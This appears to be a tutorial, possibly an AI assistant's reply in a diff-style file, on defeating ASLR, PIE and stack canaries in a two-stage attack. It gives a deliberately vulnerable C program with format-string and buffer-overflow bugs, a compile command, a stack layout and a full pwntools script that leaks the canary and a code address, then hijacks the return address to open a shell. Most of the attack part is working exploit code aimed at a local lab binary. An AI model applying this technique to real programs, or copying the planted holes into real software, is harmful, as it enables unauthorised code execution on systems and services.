@@ -1,1 +1,148 @@
+When you enable ASLR, PIE, and Stack Canaries, a basic buffer overflow will no longer work. Randomization prevents you from hardcoding addresses, and the stack canary acts as a "tripwire"—if you overwrite the return address, you will inevitably overwrite the canary, causing the program to immediately terminate with a *** stack smashing detected *** error.
+To bypass all three protections simultaneously, you must perform a two-stage attack.
+1. Stage 1: The Information Leak. Find a vulnerability (like a Format String bug or an out-of-bounds read) that lets you read memory. You need to leak two things: the Stack Canary value and a Code Address (to calculate the PIE base).
+2. Stage 2: The Control Flow Hijack. Construct your overflow payload, insert the leaked canary exactly where it belongs so the program doesn't crash, calculate the randomized address of your target function using the PIE base, and overwrite the return address.
+Here is a step-by-step example using a vulnerable C program and a pwntools exploit script.
 
+1. The Protected C Program (secure_vuln.c)
+
+This program has two functions. The first contains a Format String vulnerability (printf(input)) which allows us to leak data out of the stack. The second contains the classic Buffer Overflow (read).
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Opening shell...\n");
+    system("/bin/sh");
+}
+
+void leak_and_overflow() {
+    char input[64];
+    char buffer[64];
+
+    // 1. Format string vulnerability to leak Canary and PIE address
+    printf("Tell me something: ");
+    int bytes_read = read(0, input, 63);
+    input[bytes_read - 1] = '\0'; // strip newline
+    printf(input); // VULNERABILITY: User input passed directly to printf
+    printf("\n");
+
+    // 2. Buffer overflow vulnerability
+    printf("Tell me more: ");
+    // VULNERABILITY: Reading 256 bytes into a 64-byte buffer
+    read(0, buffer, 256); 
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    leak_and_overflow();
+    return 0;
+}
+Use code with caution.
+
+Compilation (All Protections Enabled)
+
+We compile this with standard modern security settings enabled:
+bash
+gcc -m32 -fstack-protector-all -fPIE -pie secure_vuln.c -o secure_vuln
+Use code with caution.
+
+2. Understanding the Secure Stack Layout
+
+Because the stack canary is active, the compiler repositions variables to place the canary directly above the saved stack frames:
+text
+       Top of Stack (Lower Memory Address)
+       +----------------------------------+
+
+       |       buffer (64 bytes)          |  <-- Where our overflow starts
+       +----------------------------------+
+
+       |   Compiler Padding / Alignment   |
+       +----------------------------------+
+
+       |      STACK CANARY (4 bytes)      |  <-- MUST BE PRESERVED/REPLANTED
+       +----------------------------------+
+
+       |       Saved EBP (4 bytes)        |
+       +----------------------------------+
+
+       |     Return Address (4 bytes)     |  <-- Target to overwrite
+       +----------------------------------+
+       Bottom of Stack (Higher Memory Address)
+Use code with caution.
+
+3. Step-by-Step Exploitation Plan
+
+
+Step 1: Analyze the Leak
+
+By sending format string specifiers like %p (which prints pointers off the stack), we can inspect memory. Through testing or debugging in GDB, we discover:
+• The Canary Location: Let's say the 15th %p leaked value corresponds to the Stack Canary (it always ends in 00 on Linux to prevent string-reading functions from leaking it).
+• The PIE Base Location: Let's say the 3rd %p leaked value is a code address pointing inside leak_and_overflow.
+
+Step 2: Calculate the PIE Base Offset
+
+Open the binary in GDB without running it (gdb ./secure_vuln) to see the static compilation offsets:
+• Check the static address of the function leaked at the 3rd index: e.g., 0x1230.
+• Check the static address of the win function: e.g., 0x11b0.
+• PIE Base Calculation: PIE Base = Leaked Address - 0x1230.
+• Actual Win Address: Actual Win = PIE Base + 0x11b0.
+
+4. The Python Exploit Script (bypass.py)
+
+This Python 3 script uses pwntools to capture the leaks, parse the values, calculate the randomized addresses on the fly, and perfectly reconstruct the canary value into the overflow payload.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Establish the process
+io = process('./secure_vuln')
+
+# ==========================================
+# STAGE 1: LEAK CANARY AND PIE ADDRESS
+# ==========================================
+
+# Send format string payload to leak 3rd pointer (PIE) and 15th pointer (Canary)
+# (Note: exact index positions vary depending on compiler optimization and environment)
+io.recvuntil(b"Tell me something: ")
+io.sendline(b"%3$p.%15$p")
+
+# Receive the leaked string and split it
+leaks = io.recvline().strip().decode().split('.')
+leaked_pie = int(leaks[0], 16)
+leaked_canary = int(leaks[1], 16)
+
+log.success(f"Leaked Stack Canary: {hex(leaked_canary)}")
+log.success(f"Leaked Code Address: {hex(leaked_pie)}")
+
+# Calculate the randomized target address using static offsets
+static_leak_offset = 0x1230  # Found via static analysis in GDB
+static_win_offset = 0x11b0   # Found via static analysis in GDB
+
+pie_base = leaked_pie - static_leak_offset
+actual_win = pie_base + static_win_offset
+
+log.info(f"Calculated PIE Base: {hex(pie_base)}")
+log.info(f"Calculated 'win' Address: {hex(actual_win)}")
+
+# ==========================================
+# STAGE 2: BYPASS CANARY & HIJACK FLOW
+# ==========================================
+
+# Determine exact distance to Canary (64 byte buffer + any compiler padding)
+# Let's assume testing showed it takes exactly 64 bytes to reach the Canary
+bytes_to_canary = 64 
+
+# Reconstruct the payload perfectly
+payload = b"A" * bytes_to_canary     # Fill buffer up to the canary
+payload += p32(leaked_canary)        # Plant the leaked canary back unharmed
+payload += b"B" * 4                  # Overwrite Saved EBP (4 bytes)
+payload += p32(actual_win)           # Overwrite Return Address with actual win()
+
+# Send the payload to the buffer overflow prompt
+io.recvuntil(b"Tell me more: ")
+io.sendline(payload)
+
+# Interact with the newly spawned shell
+io.interactive()
